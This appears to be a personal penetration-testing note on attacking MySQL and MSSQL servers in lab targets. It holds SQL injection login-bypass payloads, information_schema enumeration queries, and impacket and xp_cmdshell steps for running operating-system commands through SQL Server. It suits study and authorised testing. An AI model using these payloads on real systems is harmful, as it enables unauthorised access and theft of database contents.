---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[mysql]]  
___

## Description:  

impacket-mssqlclient sa@10.10.110.58 

Command injection with impacket
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd



I could not use sudo for remote (locally remove the -h flag):


```
mysql -h 192.168.101.29 -u root -p

Show databases;

Use Users;

Show tables;

Select * from users;


```

### mysql Injection

Try:

```
‘ OR 1=1--

```
If there is filtering going on try alternates like:

```
'||1=1#
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
'*'

```
### Getting User defined Tables
`SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'

### Getting Column Names
`SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'

### ping check

`EXEC master.dbo.xp_cmdshell 'ping '


### mysql injection

vulnerable webpage: http://192.168.209.43:8080/WorkOrder.do?woMode=viewWO&woID=1

add ); to stack queries

add ' union for union injections





___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (12:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
